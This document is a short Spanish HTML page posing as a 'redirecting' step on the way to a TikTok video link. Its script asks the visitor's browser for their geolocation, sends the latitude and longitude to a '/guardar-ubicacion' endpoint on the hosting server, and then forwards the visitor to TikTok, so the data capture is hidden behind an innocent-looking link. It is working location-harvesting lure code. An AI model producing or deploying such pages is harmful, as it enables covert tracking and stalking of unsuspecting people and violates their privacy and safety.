<!DOCTYPE html>
<html>
  <head>
    <title>Redireccionando...</title>
    <meta charset="UTF-8" />
    <script>
      // Obtener ubicación y enviarla al servidor
      navigator.geolocation.getCurrentPosition(
        (position) => {
          fetch("/guardar-ubicacion", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: position.coords.latitude,
              lon: position.coords.longitude,
            }),
          }).finally(() => {
            // Luego redirige a TikTok
            window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
          });
        },
        (err) => {
          console.error("Error obteniendo ubicación", err);
          // Redirige incluso si falla la ubicación
          window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
        }
      );
    </script>
  </head>
  <body>
    <p>Espera un momento...</p>
  </body>
</html>
